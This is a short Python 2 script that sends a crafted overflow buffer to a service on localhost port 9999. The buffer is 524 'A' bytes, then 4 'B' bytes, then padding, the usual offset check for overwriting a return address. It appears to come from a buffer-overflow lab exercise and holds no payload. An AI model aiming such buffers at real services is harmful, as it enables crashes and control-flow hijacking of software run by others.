#!/usr/bin/python 

import socket,sys

address = '127.0.0.1'
port = 9999
buffer = '\x41'*524 + '\x42'*4 + '\x43'*(600-524-4)

try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)			
	s.send(buffer + '\r\n')
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()